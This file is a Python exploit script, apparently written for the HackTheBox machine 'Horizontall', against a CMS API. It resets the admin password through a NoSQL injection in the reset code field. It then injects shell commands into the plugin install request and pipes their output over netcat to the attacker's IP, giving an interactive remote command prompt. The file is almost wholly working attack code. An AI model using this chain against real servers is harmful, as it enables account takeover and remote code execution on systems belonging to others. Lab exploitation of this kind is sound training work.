import requests as req
from os import system
import threading
import json
import sys

s = req.Session()

url = "http://api-prod.horizontall.htb"
my_ip = "10.10.14.196"

# Reset password
def reset_psw():
    
    new_pass = "imacutecupcake"

    payload = {
        "password" : new_pass,
        "passwordConfirmation" : new_pass,
        "code" : {
            "$gt":0
            }
    }

    print("[»] Resetting admin password...")
    r = s.post(f"{url}/admin/auth/reset-password", json = payload)

    if "admin" in r.text:
        print("[+] Success! The password was resetted!")

        data = json.loads(r.text)

        print("The new credentials are: ")
        print(f"\t- Username: {data['user']['username']}")
        print(f"\t- Email: {data['user']['email']}")
        print(f"\t- Password: {payload['password']}")
        print(f"\t- JW Token: {data['jwt'][:30]}...")

        return data['jwt']
        
    else:
        print("ERROR: Something went wrong")
        sys.exit(1)

print("-"*30+"\n")

##########
##########

# Run blind RCE
def run_cmd(jwt):

    headers = {
        "Authorization" : f"Bearer {jwt}"
        }

    print("-"*30+"\n")
    print("[+] Initializing terminal-like prompt")
    print("ATTENTION: wait untill you see the prompt to inject another command\n")

    while True:
        cmd_inj = input("\n$> ")

        print("[»] Trying to trigger blind RCE...\n")

        payload = {
            "plugin" : f"documentation && $({cmd_inj} | nc {my_ip} 1234)",
            "port" : "1337"
            }

        x = threading.Thread(target=rcv_output, daemon=True)
        x.start()
        req.post(f"{url}/admin/plugins/install", json = payload, headers = headers)
        x.join()

def rcv_output():
    system(f"timeout 1s nc -lnvp 1234 2> /dev/null")
    #Redirect netcat and timeout stderr to null in order to have a cleaner output

run_cmd(reset_psw())

